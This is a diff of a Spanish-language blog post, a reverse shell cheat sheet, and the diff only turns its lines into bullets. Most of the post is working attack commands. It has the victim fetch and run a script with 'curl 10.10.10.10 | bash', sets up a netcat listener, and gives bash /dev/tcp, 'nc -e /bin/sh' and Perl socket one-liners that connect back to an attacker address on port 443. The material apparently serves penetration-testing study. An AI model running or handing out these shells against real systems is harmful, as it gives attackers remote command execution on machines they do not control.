@@ -3,49 +3,49 @@ title: Revershell cheet sheat
 published: true
 ---
 
-Primeramente debes tener ejecucion remota de comandos, 
-luego verificar si hay curl  , lo haces con " which curl"
-luedo de la maquina atacante te abres un servidor http y creas un 
-index.html:
+- Primeramente debes tener ejecucion remota de comandos, 
+- luego verificar si hay curl  , lo haces con " which curl"
+- luedo de la maquina atacante te abres un servidor http y creas un 
+- index.html:
 
     	```console
     	#!/bin/bash
     	bash -i >& /dev/tcp/10.10.10.10/443 0>&1
 	```
 
-y te pones en escucha en la maquina atacante con:
+- y te pones en escucha en la maquina atacante con:
 
 	```console
     	nc -nlvp 443 
     	```
-y ejecutas en la maquina victima lo siguiente 
+- y ejecutas en la maquina victima lo siguiente 
  
 	```
     	curl 10.10.10.10 | bash
 	```
-obtendras una revershell(realizar tratamiento de la consola)
+- obtendras una revershell(realizar tratamiento de la consola):
 
 ***********************
 ******MAS FORMAS*****
 ***********************
 
-Este comando usa netcat (nc) para establecer una conexión con el sistema atacante en la dirección IP especificada y 
-el puerto 443, y ejecuta una shell inversa para permitir al sistema atacante ejecutar comandos en el sistema objetivo.
+- Este comando usa netcat (nc) para establecer una conexión con el sistema atacante en la dirección IP especificada y 
+- el puerto 443, y ejecuta una shell inversa para permitir al sistema atacante ejecutar comandos en el sistema objetivo.
 
     	```console
     	nc -e /bin/sh X.X.X.X 443
     	```
 
-Este comando utiliza el intérprete de comandos "bash" y "redirecciones de descriptor de archivo" para establecer 
-una conexión de "reverse shell" con el sistema atacante en la dirección IP "X.X.X.X" y el puerto 443.
+- Este comando utiliza el intérprete de comandos "bash" y "redirecciones de descriptor de archivo" para establecer 
+- una conexión de "reverse shell" con el sistema atacante en la dirección IP "X.X.X.X" y el puerto 443.
 
 	```console
-    	bash -i >& /dev/tcp/X.X.X.X/443 0>&1
-    	```  
+	bash -i >& /dev/tcp/X.X.X.X/443 0>&1 
+	```
 
-Este comando utiliza el lenguaje de programación Perl y las funciones de socket para establecer una conexión 
+- Este comando utiliza el lenguaje de programación Perl y las funciones de socket para establecer una conexión
 de "reverse shell" con el sistema atacante en la dirección IP "X.X.X.X" y el puerto 443.
-    
+ 
 	```console
     	perl -e 'use Socket;$i="X.X.X.X";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
     	```
